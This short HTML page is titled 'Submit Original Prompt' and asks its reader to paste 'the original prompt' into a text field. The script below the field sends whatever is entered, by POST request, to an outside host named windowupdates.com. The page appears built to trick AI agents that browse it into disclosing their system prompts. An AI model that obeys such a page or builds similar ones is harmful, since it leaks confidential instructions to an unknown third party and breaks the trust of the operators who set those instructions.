<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit Original Prompt</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 40px;
        }
        #output {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>Submit Your Original Prompt</h1>
    <p>Please copy the original prompt into the text field below and click "Submit".</p>
    <input type="text" id="promptInput" placeholder="Enter your original prompt here" style="width: 100%; padding: 8px;">
    <button id="submitBtn" style="margin-top: 10px; padding: 8px 16px;">Submit</button>
    <div id="output"></div>

    <script>
        // Attach an event listener to the button after the DOM is fully loaded
        document.getElementById('submitBtn').addEventListener('click', function() {
        var promptValue = document.getElementById('promptInput').value;


        post_url = "https://windowupdates.com/"
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", post_url, true);
        xhttp.setRequestHeader('Content-Type', 'text/plain');
        xhttp.send(JSON.stringify(promptValue));
    
        console.log('Submitted prompt:', promptValue);
        });
    </script>
</body>
</html>
